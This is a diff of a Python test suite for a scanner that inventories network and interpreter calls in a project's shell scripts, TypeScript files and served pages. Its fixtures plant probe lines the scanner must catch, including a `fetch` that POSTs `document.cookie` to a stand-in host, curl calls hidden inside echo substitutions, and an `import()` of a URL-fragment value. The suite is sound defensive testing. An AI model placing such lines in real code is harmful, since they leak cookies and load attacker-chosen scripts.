+                    "drops the token from its address before it frames its panes, and frames them without it); these paint requests are the one "
+                    "exception to the trust model's sentence on `Referrer-Policy: same-origin` (the response is blocked as cross-origin; the "
+                    "request, with those headers, has reached the host)")
+PAINT_TOKEN_CONDITION = "only when the page's own address carries `?token=`"
 CHAT_MEDIA_NO_TOKEN_WITHDRAWN = "no serve token, key or login token rides"
+# extra6-4: the clicked-link sent cell no longer says the serve token travels only on the bundles' own URLs; it says what romp adds
+# to a link's URL and points at the paint reference's Referer with the paint clause's condition, and the old words are held absent,
+# with the words of the parenthetical's first rewording (CLICKED_WITHDRAWN)
+CLICKED_TRAVELS_ONLY_WITHDRAWN = "the serve token travels only on"
+CLICKED_NEW = ("romp adds no serve token, key or login token to a link's URL (a link is built from content or the checkout, never from the "
+               "page's address; a paint request's Referer, in the chat-media row and the row for the chat's file preview and a notice card, "
+               "can carry the full page address with the serve token, but only when the page's own address carries `?token=`)")
+CLICKED_WITHDRAWN = ("no serve token, key or login token rides", "no link carries the serve token", "the one request whose header")
+# the chat-media sent cell's cookie clause, one text with SECURITY.md's sentence and the entry's census paragraph, and the cookie words
+# it replaces, held absent from the cell and the paragraph
+CHAT_MEDIA_COOKIES = "with whatever cookies that browser sends to that host and no Referer to any other origin"
+CHAT_MEDIA_COOKIES_WITHDRAWN = ("the cross-site cookies that browser sends", "SameSite", "Lax or Strict")
 CHAT_MEDIA_ROW = '_t("chat-media", "ui/webview/render.ts:mdImgPostPass")'
 MD_IMG_ENTRY = '("mdImgPostPass", r"(?<!function )\\bmdImgPostPass\\(")'
 MD_IMG_ENTRY_NO_LOOKBEHIND = '("mdImgPostPass", r"\\bmdImgPostPass\\(")'
@@ -1588,11 +1793,16 @@ class TheEchoRuleScansTheLiveRemainder(_SharedRun):
     """An echo- or print-led shell line is skipped as a printed remedy only when nothing live follows the printed text (the fourth
     round of the review, correctness-1 and regression-2): the text outside the quotes and the body of every $(...) and backtick
     substitution are scanned by the interpreter arm and the tool list, so `echo "$body" | curl ...` and `echo "rate: $(curl ...)"`
-    are curl sites on bin/romp's row (its committed count moves by two), a python3 -c substitution is an interpreter site on its
-    row (by one) and a node -e one is UNCLASSIFIED, while a remedy that names a tool inside its quotes stays no site: three copies
-    of the tree's own remedy lines list nothing, and the four originals, located by content, have no site line while the tree runs
-    clean. Before the round every such line was skipped whole, so the four live shapes were silent at exit 0. The block is
-    appended to bin/romp in the shared shell run (no other member touches that file); its lines are recorded by content."""
+    are curl sites on bin/romp's row, as are, since the fifth round (tests-1), four lines that each hold one arm of
+    _live_remainder's walk: a backtick substitution inside the quotes (the top loop's backtick branches), a subshell paren before
+    the curl inside a body (the paren-depth counter), a quoted paren before it (the body walk's quote state) and a backslash-escaped
+    paren before it (the body walk's backslash escape); the row's committed count moves by six, and each line is asserted on its
+    own, so a removed arm reds the pin that names it (M47 to M50, one-line mutants of a scratch copy of the script, in the round's
+    record). A python3 -c substitution is an interpreter site on its row (by one) and a node -e one is UNCLASSIFIED, while a remedy
+    that names a tool inside its quotes stays no site: three copies of the tree's own remedy lines list nothing, and the four
+    originals, located by content, have no site line while the tree runs clean. Before the fourth round every such line was skipped
+    whole, so the live shapes were silent at exit 0. The block is appended to bin/romp in the shared shell run (no other member
+    touches that file); its lines are recorded by content."""
 
     RUN = "shell"
 
@@ -1606,12 +1816,20 @@ class TheEchoRuleScansTheLiveRemainder(_SharedRun):
         self.assertRefused(self.rc, out, "UNCLASSIFIED")
         self.assertListed(out, r"bin/romp:%d  curl  echo \"\$body\" \| curl .*  in -  -> local-kernel$" % at["pipe"], "the pipe form: live text outside the quotes")
         self.assertListed(out, r"bin/romp:%d  curl  echo \"rate: \$\(curl .*  in -  -> local-kernel$" % at["substitution"], "the substitution's body, inside the quotes, is live")
+        self.assertListed(out, r"bin/romp:%d  curl  echo \"tick: `curl .*  in -  -> local-kernel$" % at["backtick"],
+                          "a backtick substitution inside the quotes is live: the top loop's backtick branches")
+        self.assertListed(out, r"bin/romp:%d  curl  echo \"\$\( \(cd /tmp\) ; curl .*  in -  -> local-kernel$" % at["subshell"],
+                          "a subshell paren inside the body does not close it: the paren-depth counter")
+        self.assertListed(out, r"bin/romp:%d  curl  echo \"\$\(printf '\)' ; curl .*  in -  -> local-kernel$" % at["quoted"],
+                          "a quoted paren inside the body does not close it: the body walk's quote state")
+        self.assertListed(out, r"bin/romp:%d  curl  echo \"\$\(printf \\\) ; curl .*  in -  -> local-kernel$" % at["escaped"],
+                          "a backslash-escaped paren inside the body does not close it: the body walk's backslash escape")
         self.assertListed(out, r"bin/romp:%d  python3 -c  .*  in -  -> local-kernel \[external-program\]" % at["python"], "an interpreter substitution is a site on its row, classed")
         self.assertIn("bin/romp:%d" % at["node"], unclassified(out), "the node -e substitution has no row: UNCLASSIFIED")
         self.assertListed(out, r"bin/romp:%d  node -e  .*  in -  -> UNCLASSIFIED \[external-program\]" % at["node"])
         expected = _expected()
         self.assertRefused(self.rc, out, "COUNTS per_key bin/romp:curl: the committed count is %d, this run found %d"
-                           % (expected["per_key"]["bin/romp:curl"], expected["per_key"]["bin/romp:curl"] + 2),
+                           % (expected["per_key"]["bin/romp:curl"], expected["per_key"]["bin/romp:curl"] + 6),
                            "COUNTS per_key bin/romp:python3 -c: the committed count is %d, this run found %d"
                            % (expected["per_key"]["bin/romp:python3 -c"], expected["per_key"]["bin/romp:python3 -c"] + 1),
                            "COUNTS per_key bin/romp:node -e: the committed count is None, this run found 1")
@@ -1631,12 +1849,12 @@ class TheEchoRuleScansTheLiveRemainder(_SharedRun):
             self.assertFalse(_listed(out, "%s:%d  " % (rel, n)), "%s:%d prints a remedy whose pipe or substitution stands inside the quotes: no site" % (rel, n))
 
     def test_the_head_skip_restored_leaves_the_live_lines_silent(self):
-        """M19: the one-line skip the round replaced, restored in a scratch copy of the script, skips the four live shapes whole."""
+        """M19: the one-line skip the round replaced, restored in a scratch copy of the script, skips the eight live shapes whole."""
         lines = self.lines(self.append("bin/romp", ECHO_TEXT))
         at = {name: next(i + 1 for i, ln in enumerate(lines) if ln.startswith(start)) for name, start in ECHO_STARTS}
         self.replace(INVENTORY, ECHO_ARM, ECHO_SKIP)
         rc, out, _ = inventory(scope_copy())
-        for name in ("pipe", "substitution", "python", "node"):
+        for name in ("pipe", "substitution", "python", "node", "backtick", "subshell", "quoted", "escaped"):
             self.assertFalse(_listed(out, "bin/romp:%d  " % at[name]), "%s: under the head's skip the live line is silent (the defect the arm closes)" % name)
         self.assertNotIn("bin/romp:%d" % at["node"], unclassified(out))
         self.assertNotIn("COUNTS per_key bin/romp:", out, "no bin/romp count moves: the run reads as the tree at exit %d" % rc)
@@ -1710,12 +1928,222 @@ class TheConnectionFamilyIsReadThroughItsBindings(_SharedRun):
                            "COUNTS per_key ui/romp-timeline-view.js:http.request: the committed count is 2, this run found None")
 
 
+class TheAddedBindingShapesAreRead(_SharedRun):
+    """The fifth round of the review (correctness-3): _binding_patterns gained the mixed default-plus-named import (the default a
+    space, the brace list names), the default-plus-namespace import (both spaces), `import { default as X }` (X a space), TypeScript's
+    `import X = require()` and a bound `await import()` whole (a space) and destructured (names), each alternative one line of the
+    script; the shapes reach child_process through the same patterns. probe-binding-shapes.ts, planted in the shared browser run,
+    calls through each shape once over http, ws and child_process, and every call line is a site keyed by the family's tool with no
+    row; probe-unread-bindings.ts plants the three shapes no pattern reads (a require assigned after its declaration, a `.then()`
+    callback parameter, an aliased require) over the same three modules and is the residual's witness: no line of it is a site, and
+    no IMPORT line names it (the modules are known, so the import gate is silent too); probe-unread-https.ts plants the same three
+    over https, where the gate reads the first two by their literal require() and import() and the aliased require is neither
+    refused nor a site (UNREAD_BINDINGS, the docstring's sentence, held here). No scan is added: each alternative's line removed from
+    a scratch copy of the script silences that arm's lines and no other, a red the round's record carries (M40 to M46) and not a case
+    of its own, since each such case would be a full scan. Every property is a line of these files, so the run's other members
+    (appended to strip.ts, or files of their own) cannot satisfy or fail one."""
+
+    RUN = "browser"
+    SHAPES, UNREAD, HTTPS = "ui/webview/probe-binding-shapes.ts", "ui/webview/probe-unread-bindings.ts", "ui/webview/probe-unread-https.ts"
+
+    @classmethod
+    def mutate(cls, cleanup):
+        _plant(cls.SHAPES, SHAPES_TEXT, cleanup)
+        _plant(cls.UNREAD, UNREAD_TEXT, cleanup)
+        _plant(cls.HTTPS, UNREAD_HTTPS, cleanup)
+
+    def test_each_added_shape_is_a_site_keyed_by_the_familys_tool(self):
+        out = self.out
+        self.assertRefused(self.rc, out, "UNCLASSIFIED")
+        named = unclassified(out)
+        for shape, (line, tool) in SHAPE_LINES.items():
+            self.assertIn("%s:%d" % (self.SHAPES, line), named, shape)
+            self.assertListed(out, r"%s:%d  %s  .*  in -  -> UNCLASSIFIED$" % (re.escape(self.SHAPES), line, re.escape(tool)), shape)
+        for tool, n in SHAPE_COUNTS.items():
+            self.assertRefused(self.rc, out, "COUNTS per_key %s:%s: the committed count is None, this run found %d" % (self.SHAPES, tool, n))
+        self.assertEqual(sorted(int(ln.split("  ")[0].rsplit(":", 1)[1]) for ln in _listed(out, self.SHAPES + ":")),
+                         sorted(line for line, _ in SHAPE_LINES.values()), "the call lines and no other line of the file")
+
+    def test_the_unread_shapes_are_no_site_the_residual_witness(self):
+        out = self.out
+        self.assertIn(UNREAD_BINDINGS, _inventory_docstring(), "the docstring states the residual this file witnesses")
+        self.assertFalse(_listed(out, self.UNREAD + ":"), "no pattern reads these shapes, so no line is a site (the disclosed residual)")
+        self.assertFalse([t for t in unclassified(out) if t.startswith(self.UNREAD + ":")])
+        self.assertNotIn("IMPORT " + self.UNREAD, out, "http, ws and child_process are known packages: the gate is not what holds them")
+
+    def test_over_https_the_gate_reads_the_literal_shapes_and_not_the_aliased_require(self):
+        out = self.out
+        self.assertRefused(self.rc, out, "IMPORT %s:2 imports https" % self.HTTPS, "IMPORT %s:4 imports https" % self.HTTPS)
+        for line in (5, 6):
+            self.assertNotIn("IMPORT %s:%d " % (self.HTTPS, line), out, "an aliased require spells no literal require(): the gate does not read it")
+        self.assertFalse(_listed(out, self.HTTPS + ":"), "no line of the file is a site: the aliased require's https reaches the network unread")
+
+
+# F, G and H of the fifth round, planted in the same served pass: a route's content type (F), the receivers and containers a
+# page's text is read through (G) and how served text is read per line (H). Every plant but three is a do_GET branch landed
+# before the /chat branch (FGH_ROUTES) with what it reads appended at the module's end (FGH_DEFS) or bound in Handler's body
+# (FGH_HANDLER); H1 and H2 are parts of the drift banner's joined constants, and F11 respells the one place an allowlist entry
+# covers. A plant's page is one fetch naming the plant by its tag (FGH_PAGE), located by the URL with its closing quote
+# (_fgh_mark), so f1 never matches f10.
+FGH_PAGE = "<script>fetch('https://example.invalid/%s')</script>"
+
+
+def _fgh_route(tag, *body):
+    """A do_GET branch serving /probe-<tag> with the given body lines, in the shape ROUTE_PLANTS lands before the /chat branch."""
+    return '            if p == "/probe-%s":\n' % tag + "".join("                %s\n" % ln for ln in body)
+
+
+def _fgh_mark(tag):
+    """The text that locates a plant page's fetch by content: its URL with the closing quote."""
+    return "https://example.invalid/%s'" % tag
+
+
+FGH_ROUTES = "".join((
+    _fgh_route("f1", 'return self._send(200, "%s", _PROBE_F1_CT)' % (FGH_PAGE % "f1")),
+    _fgh_route("f2", 'return self._send(200, "%s", ctype="text/html")' % (FGH_PAGE % "f2")),
+    _fgh_route("f3", 'return self._send(200, "%s", "Text/HTML; Charset=UTF-8")' % (FGH_PAGE % "f3")),
+    _fgh_route("f4", 'return self._send(200, "<svg xmlns=\'http://www.w3.org/2000/svg\'>%s</svg>", "image/svg+xml")' % (FGH_PAGE % "f4")),
+    _fgh_route("f5", 'return self._send(200, "<html xmlns=\'http://www.w3.org/1999/xhtml\'>%s</html>", "application/xhtml+xml")' % (FGH_PAGE % "f5")),
+    _fgh_route("f6", 'return self._send(200, "fetch(\'https://example.invalid/f6\');", "application/javascript")'),
+    _fgh_route("f7", 'self.send_response(200)', 'self.send_header("Content-Type", "text/html")', 'self.end_headers()',
+               'self.wfile.write(b"%s")' % (FGH_PAGE % "f7"), 'return'),
+    _fgh_route("f8", '_pct8 = "text/html"', 'return self._send(200, "%s", _pct8)' % (FGH_PAGE % "f8")),
+    _fgh_route("f9", 'return self._send(200, open("/nonexistent").read(), _PROBE_F9_CT)'),
+    _fgh_route("f10", 'return self._send(200, "%s", _probe_f10_type())' % (FGH_PAGE % "f10")),
+    _fgh_route("f12", 'ct = "text/html"', 'return self._send(200, "%s", ct + "; charset=utf-8")' % (FGH_PAGE % "f12")),
+    _fgh_route("g1", 'return self._send(200, _probe_g1().encode("utf-8"), "text/html")'),
+    _fgh_route("g1b", 'return self._send(200, _PROBE_G1B.encode("utf-8"), "text/html")'),
+    _fgh_route("g2", 'return self._send(200, _PROBE_G2S.get(p, "<p>none</p>"), "text/html")'),
+    _fgh_route("g3", 'return self._send(200, _PROBE_G3S["/probe-g3"] + "\\n", "text/html")'),
+    _fgh_route("g4", 'return self._send(200, _PROBE_G4.format_map({"a": "b"}), "text/html")'),
+    _fgh_route("g4b", 'return self._send(200, _probe_g4b().format_map({"a": "b"}), "text/html")'),
+    _fgh_route("g5", 'return self._send(200, "<html>" + self._PROBE_G5, "text/html")'),
+    _fgh_route("g6", 'return self._send(200, "<html>" + _PROBE_G6S["x"], "text/html")'),
+    _fgh_route("g7", 'return self._send(200, _probe_g7().get("x", "<p>none</p>"), "text/html")'),
+    _fgh_route("g8", 'return self._send(200, "<p>" + _PROBE_G8_MEMO["k"], "text/html")'),
+    _fgh_route("g9", 'return self._send(200, _PROBE_G9S.get("x", "").strip().encode("utf-8"), "text/html")'),
+    _fgh_route("g10", 'return self._send(200, _probe_g10().get("x", "").encode("utf-8"), "text/html")'),
+    _fgh_route("g11", 'return self._send(200, self._probe_g11().get("x", ""), "text/html")'),
+    _fgh_route("g15", 'return self._send(200, _probe_g15a() + _probe_g15b(), "text/html")'),
+    _fgh_route("h4", 'return self._send(200, "<script>import(\'/dist/probe.js\');import(location.hash.slice(1))</script>", "text/html")'),
+    _fgh_route("h5", 'return self._send(200, f"""<html>', '<p>{p}</p>%s' % (FGH_PAGE % "h5"), '</html>""", "text/html")'),
+    _fgh_route("h6", 'return self._send(200, f"""{p}', FGH_PAGE % "h6", '{p}', FGH_PAGE % "h6", '{p}""", "text/html")'),
+    _fgh_route("h7", 'return self._send(200, "%s" + p + "%s", "text/html")' % (FGH_PAGE % "h7", FGH_PAGE % "h7")),
+    _fgh_route("r1", 'return self._send(200, f"""<p>{p', '}%s</p>""", "text/html")' % (FGH_PAGE % "r1")),
+    _fgh_route("r2", 'return self._send(200, ("<a>"', ' f"<b>{p}"', ' "%s"), "text/html")' % (FGH_PAGE % "r2")),
+    _fgh_route("r3", 'return self._send(200, (f"<p>{p}</p>"', ' f"%s"), "text/html")' % (FGH_PAGE % "r3"))))
+FGH_DEFS = "\n\n" + "\n\n\n".join((
+    '_PROBE_F1_CT = "text/html; charset=utf-8"',
+    '_PROBE_F9_CT = "text/html"',
+    'def _probe_f10_type():\n    return "text/html"',
+    'def _probe_g1():\n    return "%s"' % (FGH_PAGE % "g1"),
+    '_PROBE_G1B = "%s"' % (FGH_PAGE % "g1b"),
+    '_PROBE_G2S = {"/probe-g2": "%s"}' % (FGH_PAGE % "g2"),
+    '_PROBE_G3S = {"/probe-g3": "%s"}' % (FGH_PAGE % "g3"),
+    '_PROBE_G4 = "%s{a}"' % (FGH_PAGE % "g4"),
+    'def _probe_g4b():\n    return "%s{a}"' % (FGH_PAGE % "g4b"),
+    '_PROBE_G6S = {"x": "%s", "n": 3}' % (FGH_PAGE % "g6"),
+    'def _probe_g7():\n    return {"x": "%s"}' % (FGH_PAGE % "g7"),
+    '_PROBE_G8_MEMO = {}\n\n\ndef _probe_g8_fill(t):\n    _PROBE_G8_MEMO["k"] = t',
+    '_PROBE_G9S = {"x": "%s"}' % (FGH_PAGE % "g9"),
+    'def _probe_g10():\n    return {"x": "%s"}' % (FGH_PAGE % "g10"),
+    'def _probe_g15a():\n    body = "<p>a</p>"\n    return body\n\n\ndef _probe_g15b():\n    body = "%s"\n    return body' % (FGH_PAGE % "g15"))) + "\n"
+FGH_HANDLER = '    _PROBE_G5 = "%s"\n\n    def _probe_g11(self):\n        return {"x": "%s"}\n\n' % (FGH_PAGE % "g5", FGH_PAGE % "g11")
+DRIFT_JS_ANCHOR = "    \"dm.onclick=function(){dismissed=key(stale);phase='idle';box.classList.remove('show');};\"\n"
+H1_PLANT = "    \"fetch('https://example.invalid/h1',{method:'POST',body:document.cookie});\"\n"   # after the constant's local fetches
+DRIFT_CSS_ANCHOR = "_RDRIFT_CSS = (\n"
+H2_PLANT = '    "*{box-sizing:border-box}</style>%s<style>"\n' % (FGH_PAGE % "h2")   # the joined constant's first part, led by *{
+# F11: the one place the _file_slice entry covers, its type argument, spelled as the literal of one of _slice_body's two types
+SLICE_SEND = 'payload if isinstance(payload, str) else json.dumps(payload), ctype, cache="no-cache")'
+SLICE_LITERAL = 'payload if isinstance(payload, str) else json.dumps(payload), "application/json", cache="no-cache")'
+SLICE_KEY = ("kernel/kernel.py:Handler._file_slice", "ctype")   # the entry F11 leaves naming nothing
+DIST_KEY = ("kernel/kernel.py:Handler.do_GET", "ct + '; charset=utf-8'")   # the /dist and /media entry F12 adds a place under
+DIST_PLACES = 2   # the places the /dist and /media entry covers at the head, the branch's two _send calls
+# the plants whose page's fetch lists UNCLASSIFIED at its own line (the plant, its tag), and the plants refused by name (the
+# plant, its tag, the SERVED line with the tag's line in place of %d), each tag's line located by content (FGH_PLANT_LINES)
+FGH_TYPED = (("F1 a type a module constant names", "f1"), ("F2 a type passed as ctype=", "f2"),
+             ("F3 a type in mixed case with a parameter", "f3"), ("F4 image/svg+xml", "f4"), ("F5 application/xhtml+xml", "f5"),
+             ("F6 application/javascript", "f6"), ("F8 a type a local binds", "f8"))
+FGH_TYPE_REFUSED = (("F7 a Content-Type written outside _send", "f7",
+                     "SERVED kernel/kernel.py:%d writes Content-Type text/html outside _send (Handler.do_GET)"),
+                    ("F9 an unreadable body under a module constant's type", "f9",
+                     "SERVED kernel/kernel.py:%d reads /nonexistent for a served page, a file the walk does not scan"),
+                    ("F10 a type a function returns", "f10",
+                     "SERVED kernel/kernel.py:%d serves a response whose content type the census cannot resolve (_probe_f10_type() in Handler.do_GET)"))
+FGH_READ = (("G1 .encode on a function's return", "g1"), ("G1b .encode on a module constant", "g1b"),
+            ("G2 .get with a default on a module dict", "g2"), ("G3 a module dict's subscript joined with a literal", "g3"),
+            ("G4 .format_map on a module constant", "g4"), ("G4b .format_map on a function's return", "g4b"),
+            ("G5 a class attribute", "g5"), ("G6 a subscript of a module dict with a value of another type", "g6"),
+            ("G9 a chain two calls deep on a module dict", "g9"), ("G15 same-named locals in two functions", "g15"))
+FGH_REFUSED = (("G7 a receiver a function returns", "g7",
+                "SERVED kernel/kernel.py:%d builds a served page from _probe_g7().get('x', '<p>none</p>') (a function's return), text the census did not read"),
+               ("G8 a container the module writes at run time", "g8",
+                "SERVED kernel/kernel.py:%d builds a served page from _PROBE_G8_MEMO['k'], a container the module writes at run time"),
+               ("G10 a chain two deep through a function's return", "g10",
+                "SERVED kernel/kernel.py:%d builds a served page from _probe_g10().get('x', '') (a function's return), text the census did not read"),
+               ("G11 a receiver a method returns", "g11",
+                "SERVED kernel/kernel.py:%d builds a served page from self._probe_g11().get('x', '') (a method's return), text the census did not read"))
+FGH_PLANT_LINES = (tuple((tag, _fgh_mark(tag)) for tag in [t for _, t in FGH_TYPED + FGH_READ] + ["f12", "h2", "h5"])
+                   + (("f7", 'self.send_header("Content-Type", "text/html")'), ("f9", 'open("/nonexistent")'), ("f10", "_probe_f10_type())"),
+                      ("g7", "_probe_g7().get("), ("g8", '_PROBE_G8_MEMO["k"], "text/html"'), ("g10", "_probe_g10().get("),
+                      ("g11", "self._probe_g11().get("), ("h4", "import(location.hash.slice(1))"), ("drift_js", "_RDRIFT_JS = ("),
+                      ("h5_open", 'f"""<html>'), ("slice", SLICE_LITERAL), (("h6_first", "h6_second"), _fgh_mark("h6")),
+                      ("h7", _fgh_mark("h7")), ("r1", _fgh_mark("r1")), ("r1_open", 'self._send(200, f"""<p>{p'), ("r2", _fgh_mark("r2")),
+                      ("r2_value", ' f"<b>{p}"'), ("r3", _fgh_mark("r3")), ("r3_open", 'self._send(200, (f"<p>{p}</p>"')))
+SERVED_COMPUTED_PLANTS = ("slot", "h4")   # the plants whose one site is the computed class: the format slot and H4's second import(
+
+
+def _plant_lines(text, specs, where):
+    """The plants' lines in `text` by content, {name: line}: for each (name, needle) of `specs` the lines carrying the needle, found
+    with str.find over the whole text and placed by one table of line starts (bisect), on _line_in's rule: a name is one line, a
+    tuple of names (a needle a plant repeats on purpose, H6's two identical parts) is that many lines in order, and any other
+    number of carrying lines is a broken pin. One pass over the text for the table and a C-level search per needle, where a
+    per-line scan for each of forty needles over the planted kernel.py cost a quarter of a second of the served pass."""
+    starts = [0] + [m.end() for m in re.finditer("\n", text)]
+    at = {}
+    for name, needle in specs:
+        if "\n" in needle or not needle:
+            raise AssertionError("a plant's needle is one non-empty line's text: %r" % (needle,))
+        hits, i = [], text.find(needle)
+        while i >= 0:
+            n = bisect.bisect_right(starts, i)
+            if not hits or hits[-1] != n:
+                hits.append(n)
+            i = text.find(needle, i + 1)
+        names = name if isinstance(name, tuple) else (name,)
+        if len(hits) != len(names):
+            raise AssertionError("the anchor %r occurs on %d lines in %s, not %d" % (needle, len(hits), where, len(names)))
+        at.update(zip(names, hits))
+    return at
+
+
 SERVED_KEY = ("tests/test_price_feed_census.py", "the served pass over the planted kernel.py")   # parse_cache.derived's key
-SERVED_PLANT_LINES = (("fetch", 'fetch("https://example.invalid/probe");'), ("alert", "}else{alert('Pull from '+h+' failed');}"),
-                      ("import", "import x from 'example-pkg';"), ("settings_def", "def _settings_page():"),
-                      ("settings_anchor", SETTINGS_ANCHOR.strip()), ("probe_read", '    return (UI / "probe.html").read_text()'),
-                      ("fstring", 'fetch(\'https://example.invalid/f\')'), ("slot", '"<script>fetch(\'%s\')</script>" % p'),
-                      ("body_param", 'return self._send(200, body, "text/html")'))   # the plants' lines, located by content once all have landed
+SERVED_PLANT_LINES = ((("fetch", 'fetch("https://example.invalid/probe");'), ("alert", "}else{alert('Pull from '+h+' failed');}"),
+                       ("import", "import x from 'example-pkg';"), ("settings_def", "def _settings_page():"),
+                       ("settings_anchor", SETTINGS_ANCHOR.strip()), ("probe_read", '    return (UI / "probe.html").read_text()'),
+                       ("fstring", 'fetch(\'https://example.invalid/f\')'), ("slot", '"<script>fetch(\'%s\')</script>" % p'),
+                       ("body_param", 'return self._send(200, body, "text/html")'))
+                      + FGH_PLANT_LINES)   # the plants' lines, located by content once all have landed; a tuple of names, one per occurrence
+SERVED_PLANTS = ((BOOT_ANCHOR, BOOT_ANCHOR + BOOT_PLANTS), (SETTINGS_ANCHOR, SETTINGS_PLANT + SETTINGS_ANCHOR),
+                 (CHAT_BRANCH, ROUTE_PLANTS + CHAT_BRANCH), (SEND_ANCHOR, SEND_PLANT + SEND_ANCHOR),
+                 (CHAT_BRANCH, FGH_ROUTES + CHAT_BRANCH), (SEND_ANCHOR, FGH_HANDLER + SEND_ANCHOR),
+                 (DRIFT_JS_ANCHOR, H1_PLANT + DRIFT_JS_ANCHOR), (DRIFT_CSS_ANCHOR, DRIFT_CSS_ANCHOR + H2_PLANT),
+                 (SLICE_SEND, SLICE_LITERAL))   # (anchor, text), in the order they land
+
+
+def _served_text(text):
+    """kernel/kernel.py's text with TheServedPagesAreScanned's plants applied: SERVED_PLANTS in order (_replace_text, so an anchor
+    that is absent or repeated is a broken mutation), then PROBE_PAGE_DEF and FGH_DEFS appended as _append lands a block. The
+    plants: the boot's fetch, socket, opener, alert and import, the settings page's beacon, the probe, f-string and
+    format-slot routes and the method serving a parameter, and, since the fifth round, F, G and H's: the F1 to F10 and F12
+    routes, the G routes with their module definitions and Handler's G5 attribute and G11 method, the H4 to H7 routes and
+    the residual's R1 to R3 routes,
+    H1 and H2 in the drift banner's joined constants, and F11's respelled _file_slice type. The plants' one writer: the served
+    pass parses this text, and the command-line case writes it into the scope copy's kernel/kernel.py, so the two plant sets
+    cannot drift."""
+    for old, new in SERVED_PLANTS:
+        text = _replace_text(text, old, new, KERNEL_PATH)
+    return text + ("" if text.endswith("\n") else "\n") + PROBE_PAGE_DEF + FGH_DEFS
 
 
 def _served_build():
@@ -1726,14 +2154,19 @@ def _served_build():
     routes with the tree's file list (its "a file the walk covers" check), and the pass spliced into the tree's one Result
     (_tree) in place of kernel/kernel.py's own contributions, then the script's figures, problems and render_sites over the
     spliced Result: (the plants' lines by content, (exit code, stdout)) as a run over a copy carrying the same plants prints
-    them, so the class's cases read the pass as they read a run. The splice is exact by construction of the script's scan():
-    a file contributes sites (Site.file), DOM lines (their rel), stylesheets (their rel), problem lines naming it and its
-    entry in served; each of kernel/kernel.py's is replaced by the planted text's, files and skipped are the tree's
-    (kernel.py is still a file), and the sites are re-sorted as scan sorts them. Held here: the tree's run served
-    kernel/kernel.py alone (a second file with routes would need the splice widened; refused, not assumed) and the script
-    has the served pass at all (a script without it, the archive of the reviewed head, is refused by name, so every case
-    of the class reds with this message and not with an error). Residual: scan()'s walk-time gate over kernel.py's Python
-    imports is not re-run over the planted text (the plants add no Python import; the tree's run gates the real ones)."""
+    them, so the class's cases read the pass as they read a run. That equality is executed, not argued (the fifth round,
+    2026-09-23): the class's command-line case runs the file as the command line runs it over the scope copy with
+    kernel/kernel.py carrying _served_text's plants and holds its exit code and stdout byte-equal to this pass's. The splice
+    replaces each of kernel/kernel.py's contributions (its sites by Site.file, its DOM lines and stylesheets by their rel, its
+    problem lines, its entry in served, and the SERVED_ALLOW and FRAME_WRITERS hits keyed on it) with the planted text's, keeps
+    the tree's files and skipped (kernel.py is still a file), and re-sorts the sites as scan sorts them; a scan() change it does
+    not replicate (a Result field it does not carry, a filter on routes or on served sites) is red in the command-line case.
+    Held here: the tree's run served kernel/kernel.py alone (a second file with routes would need the splice widened; refused,
+    not assumed) and the script has the served pass at all (a script without it, the archive of the reviewed head, is refused by
+    name, so every case of the class reds with this message and not with an error). The walk-time gate over kernel.py's Python
+    imports is not re-run over the planted text here; the command-line case runs it, so a plant that added a Python import would
+    differ there. F, G and H's plants ride this one pass (the fifth round): they add no scan, and each is held by its own
+    assertion in the class over this pass's output; the arm-removed reds are served-pass-only runs recorded outside the tree."""
     mod = script_module(ROOT)
     for name in ("Result", "Scan", "served_texts", "Site"):
         if not hasattr(mod, name):
@@ -1743,13 +2176,8 @@ def _served_build():
     if base.res.served != [KERNEL_PATH]:
         raise AssertionError("the served pass reads one file at this head, %s; the tree's run served %r, and the splice replaces that "
                              "file's contributions alone" % (KERNEL_PATH, base.res.served))
-    text = _replace_text(KERNEL, BOOT_ANCHOR, BOOT_ANCHOR + BOOT_PLANTS, KERNEL_PATH)
-    text = _replace_text(text, SETTINGS_ANCHOR, SETTINGS_PLANT + SETTINGS_ANCHOR, KERNEL_PATH)
-    text = _replace_text(text, CHAT_BRANCH, ROUTE_PLANTS + CHAT_BRANCH, KERNEL_PATH)
-    text = _replace_text(text, SEND_ANCHOR, SEND_PLANT + SEND_ANCHOR, KERNEL_PATH)
-    text = text + ("" if text.endswith("\n") else "\n") + PROBE_PAGE_DEF   # appended as _append lands a block
-    lines = text.splitlines()
-    at = {name: _line_in(lines, needle, KERNEL_PATH + " (planted)") for name, needle in SERVED_PLANT_LINES}
+    text = _served_text(KERNEL)
+    at = _plant_lines(text, SERVED_PLANT_LINES, KERNEL_PATH + " (planted)")
     tree = ast.parse(text, filename=KERNEL_PATH)
     res = mod.Result()
     res.files, res.skipped = list(base.res.files), base.res.skipped
@@ -1763,6 +2191,13 @@ def _served_build():
     merged.served_files = [f for f in base.res.served_files if f[0] != KERNEL_PATH] + res.served_files
     merged.problems = [p for p in base.res.problems if KERNEL_PATH + ":" not in p] + res.problems
     merged.served = [r for r in base.res.served if r != KERNEL_PATH] + res.served
+    # the allowlist and frame-writer hits keyed on kernel.py are the planted pass's; every other file's are the tree's, so
+    # problems() reads the same SERVED ALLOW places a real run over the planted copy reads (a whole-file scan would too). The
+    # reviewed head's Result carries no such records (its script has no SERVED_ALLOW), so there the splice reads none and each
+    # case reds at its own assertion rather than as an error in this build
+    base_hits, pass_hits = getattr(base.res, "allow_hits", {}), getattr(res, "allow_hits", {})
+    merged.allow_hits = {k: v for k, v in base_hits.items() if (k[1] if k[0] == "frame" else k[0]).split(":", 1)[0] != KERNEL_PATH}
+    merged.allow_hits.update(pass_hits)
     merged.sites.sort(key=mod.Site.tuple)
     run = _run_of(mod, ROOT, merged)
     tail = ("\n".join(run.problems) + "\n") if run.problems else ""
@@ -1777,18 +2212,31 @@ def served_pass():
 
 class TheServedPagesAreScanned(_Scope):
     """The pages the kernel serves and its service worker's script are scanned as browser text (the fourth round, fresh-1): the
-    routes' `_send` calls with a text/html or text/javascript literal are followed through kernel.py's syntax tree to the constants
-    they inline, and each piece goes through line_scan keyed kernel/kernel.py plus tool. Planted in kernel/kernel.py's text (the
-    served pass, served_pass; a run over a planted copy before the fifth round): a third-party fetch, a second socket and a
-    second opener in _TIMELINE_BOOT (the fetch UNCLASSIFIED, the two rowed tools moving their keys' counts: the keyed-by-tool
+    routes' `_send` calls whose content type runs script are followed through kernel.py's syntax tree to the constants they
+    inline, and each piece goes through line_scan keyed kernel/kernel.py plus tool (since the fifth round a call's type is read
+    through the `_send` definition it reaches, module constants, locals and dict values and compared by its essence with the
+    script-running types; a text/html or text/javascript literal before it). Planted in kernel/kernel.py's text (the served
